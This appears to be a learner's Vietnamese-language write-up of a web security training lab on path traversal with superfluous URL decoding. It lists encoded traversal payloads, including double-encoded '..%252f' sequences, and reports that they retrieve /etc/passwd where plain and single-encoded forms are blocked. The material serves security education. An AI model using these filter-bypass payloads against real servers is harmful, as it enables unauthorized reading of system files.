# Common obstacles to exploiting path traversal vulnerabilities - Continued
Trong một số ngữ cảnh, chẳng hạn như trong đường dẫn URL hoặc `filename` của `multipart/form-data`, máy chủ web có thể loại bỏ bất kỳ chuỗi duyệt thư mục nào trước khi truyền dữ liệu đầu vào của bạn đến ứng dụng. Đôi khi bạn có thể bỏ qua loại khử trùng này bằng cách mã hóa URL, hoặc thậm chí mã hóa URL kép, các ký tự `../` Điều này sẽ tạo ra `%2e%2e%2f` và `%252e%252e%252f` tương ứng. Nhiều mã hóa không chuẩn khác nhau, chẳng hạn như `..%c0%af` hoặc `..%ef%bc%8f`, cũng có thể hoạt động.

# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
Bài thực hành này chứa một lỗ hổng duyệt đường dẫn trong việc hiển thị hình ảnh sản phẩm.

Ứng dụng chặn dữ liệu đầu vào chứa các chuỗi duyệt đường dẫn. Sau đó, nó thực hiện `URL-Decode` của dữ liệu đầu vào trước khi sử dụng.

Để giải quyết bài thực hành, hãy truy xuất nội dung của tệp `/etc/passwd`.
## Kết quả
Nhập cả `../../../etc/passwd` và `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` --> lỗi 400

Play load `..%2f..%2f..%2fetc/passwd` --> `../../../etc/passwd` --> 400

Play laod `..%252f..%252f..%252fetc/passwd` -->`..%2f..%2f..%2fetc/passwd` --> `../../../etc/passwd` --> 200

Nhập `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd` -->`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` --> `../../../etc/passwd` --> 200

* decode 1 lần thất bại, nhưng decode 2 lần thì thành công.


